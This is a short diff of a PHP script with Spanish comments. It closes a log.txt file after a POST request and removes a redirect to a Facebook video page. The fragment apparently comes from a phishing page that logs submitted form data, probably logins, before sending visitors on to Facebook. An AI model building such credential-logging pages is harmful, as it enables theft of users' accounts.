@@ -12,8 +12,6 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     // Cerrar el archivo log.txt
     fclose($file);
 
-    // Redirigir al usuario a la página de Facebook
-    header('Location: https://www.facebook.com/javierhumor/videos/1234013834188186/?app=fbl');
-    exit;
+   
 }
 ?>
